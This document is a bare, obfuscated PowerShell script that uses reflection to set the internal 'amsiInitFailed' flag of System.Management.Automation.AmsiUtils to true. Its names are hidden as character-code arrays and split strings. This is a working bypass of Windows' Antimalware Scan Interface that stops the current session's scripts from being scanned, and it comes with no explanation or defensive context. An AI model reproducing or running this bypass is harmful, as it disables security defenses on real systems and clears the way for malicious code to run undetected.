$e=[Ref].('Assem'+'bly').GetType(([string]::Join('', [char[]](83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115))))
$n='Non'+'Public'
$s='Static'
$f=$e.GetField(([string]::Join('', [char[]](97,109,115,105,73,110,105,116,70,97,105,108,101,100))),($n+','+$s))
$t=[type[]]@([object],[bool])
$m=$f.GetType().GetMethod('Set'+'Value', $t)
$m.Invoke($f, @($null, $true))